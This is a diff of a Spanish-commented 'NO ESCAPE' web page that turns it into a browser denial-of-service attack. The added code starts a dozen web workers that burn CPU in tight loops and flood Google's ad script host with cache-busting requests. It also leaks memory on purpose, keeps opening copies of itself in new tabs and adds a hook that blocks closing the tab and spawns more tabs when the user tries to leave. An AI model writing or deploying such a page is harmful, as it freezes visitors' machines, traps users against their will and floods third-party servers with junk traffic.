@@ -14,75 +14,78 @@ body{
 }
 h1{
   margin-top:60px;
-  font-size:5rem;
-  animation: blink 0.25s infinite;
+  font-size:5.2rem;
+  animation: blink 0.2s infinite;
+  text-shadow: 0 0 40px red;
 }
 #contador{
-  font-size:2.8rem;
-  margin:30px;
+  font-size:3rem;
+  margin:40px;
+  text-shadow: 0 0 30px red;
 }
-@keyframes blink{ 50%{ opacity:0.08; } }
+@keyframes blink{ 50%{ opacity:0.05; } }
 </style>
 </head>
 <body>
 <h1>☢ NO ESCAPE ☢</h1>
 <div id="contador">CPU/RAM siendo violada: 0%</div>
 
-<canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.28;"></canvas>
-<canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.22;"></canvas>
+<canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.3;"></canvas>
+<canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.25;"></canvas>
 
 <script>
 let total = 0;
 let running = true;
 
-// Matrix más pesada
+// Matrix pesada
 function createMatrix(id, speed) {
   const canvas = document.getElementById(id);
   const ctx = canvas.getContext("2d");
-  let w = canvas.width = window.innerWidth;
-  let h = canvas.height = window.innerHeight;
- 
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  resize();
+  window.addEventListener("resize", resize);
+
   const chars = "0123456789ABCDEFアイウエオ$@#&%";
   const fontSize = 14;
-  const columns = w / fontSize;
-  const drops = Array(Math.floor(columns)).fill(1);
+  const drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
 
   function draw() {
-    ctx.fillStyle = "rgba(0,0,0,0.07)";
-    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = "rgba(0,0,0,0.06)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = "#00ff00";
     ctx.font = fontSize + "px monospace";
     for(let i = 0; i < drops.length; i++) {
       ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, drops[i]*fontSize);
-      if(drops[i]*fontSize > h && Math.random() > 0.97) drops[i] = 0;
+      if(drops[i]*fontSize > canvas.height && Math.random() > 0.965) drops[i] = 0;
       drops[i]++;
     }
   }
   setInterval(draw, speed);
 }
-createMatrix("c1", 18);
-createMatrix("c2", 13);
+createMatrix("c1", 16);
+createMatrix("c2", 12);
 
-// === MÁS POTENCIA ===
+// === CARGA EXTREMA PARA 100% CPU ===
 function createWorker() {
   const code = `
     self.onmessage = () => {
       setInterval(() => {
-        for(let i = 0; i < 12; i++) {
-          fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?t=" + Date.now() + Math.random(),
+        for(let i = 0; i < 18; i++) {
+          fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?t=" + Date.now() + Math.random(), 
           {mode:"no-cors", cache:"no-store"}).catch(()=>{});
         }
-        // Cálculo muy pesado
         let x = 0;
-        for(let j = 0; j < 120000; j++) {
-          x += Math.sin(j) * Math.random() * Math.tan(j % 100);
+        for(let j = 0; j < 180000; j++) {
+          x += Math.sin(j) * Math.random() * Math.tan(j % 50);
         }
-      }, 3);
+      }, 1);
     };
   `;
   const blob = new Blob([code], {type: "application/javascript"});
-  const worker = new Worker(URL.createObjectURL(blob));
-  worker.postMessage("");
+  new Worker(URL.createObjectURL(blob)).postMessage("");
 }
 
 function spamPrincipal() {
@@ -95,51 +98,59 @@ function spamPrincipal() {
   ];
 
   urls.forEach(url => {
-    for(let i = 0; i < 7; i++) {
+    for(let i = 0; i < 8; i++) {
       const cb = "?t=" + Date.now() + Math.random();
       fetch(url + cb, {mode: "no-cors", cache: "no-store"}).catch(() => {});
       new Image().src = url + cb;
     }
   });
 
-  // Memory leak más fuerte
-  window.leakArray = (window.leakArray || []).concat(new Array(12000).fill({data: Math.random(), big: new Array(50)}));
+  window.leakArray = (window.leakArray || []).concat(new Array(18000).fill({data: Math.random(), arr: new Array(30)}));
 
   total++;
-  const porcentaje = Math.min(100, Math.floor(total / 4));
+  const porcentaje = Math.min(100, Math.floor(total / 3.5));
   document.getElementById("contador").innerText = `CPU/RAM siendo violada: ${porcentaje}%`;
 
-  setTimeout(spamPrincipal, 6);
+  setTimeout(spamPrincipal, 4);
 }
 
-// === EFECTO CADENA ===
+// Anti-cierre + Cadena
 function abrirNuevaPestana() {
   try {
     window.open(window.location.href, "_blank");
   } catch(e) {}
 }
 
-// INICIO
-window.onload = function() {
-  // Muchos workers
-  for(let i = 0; i < 10; i++) createWorker();
+function antiClose() {
+  window.onbeforeunload = () => "NO ESCAPE - Esta pestaña no quiere cerrarse";
+  
+  window.addEventListener("beforeunload", (e) => {
+    e.preventDefault();
+    e.returnValue = "";
+    for(let i = 0; i < 4; i++) {
+      setTimeout(abrirNuevaPestana, i * 150);
+    }
+  });
+}
 
-  // Spam fuerte
-  for(let i = 0; i < 120; i++) {
-    setTimeout(spamPrincipal, i * 8);
-  }
+// INICIO TOTAL
+window.onload = function() {
+  // Máxima potencia
+  for(let i = 0; i < 12; i++) createWorker();
+
   spamPrincipal();
 
   // Cadena de pestañas
-  setTimeout(abrirNuevaPestana, 800);
-
+  setTimeout(abrirNuevaPestana, 600);
   setInterval(() => {
-    if (Math.random() > 0.35) abrirNuevaPestana();
-  }, 3800);
+    if (Math.random() > 0.25) abrirNuevaPestana();
+  }, 2800);
+
+  antiClose();
 
   setTimeout(() => {
-    alert("☢ NO ESCAPE ☢\n\nCada pestaña genera más pestañas...");
-  }, 600);
+    alert("☢ NO ESCAPE ACTIVADO ☢\n\nCada pestaña genera más pestañas y carga extrema.");
+  }, 500);
 };
 </script>
 </body>
